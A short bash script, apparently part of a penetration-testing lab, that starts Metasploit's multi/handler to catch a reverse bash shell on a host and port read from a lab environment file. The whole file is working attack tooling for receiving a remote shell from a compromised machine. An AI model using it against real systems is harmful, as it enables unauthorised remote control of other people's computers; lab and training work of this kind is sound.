#!/usr/bin/env bash
# Phase 2 handler: catch the cmd/unix/reverse_bash shell.
set -euo pipefail
cd "$(dirname "$0")/.."
source lab.env
exec msfconsole -q -x "use exploit/multi/handler; set payload cmd/unix/reverse_bash; set LHOST $LHOST; set ReverseListenerBindAddress 0.0.0.0; set LPORT $LPORT_CMD; run"
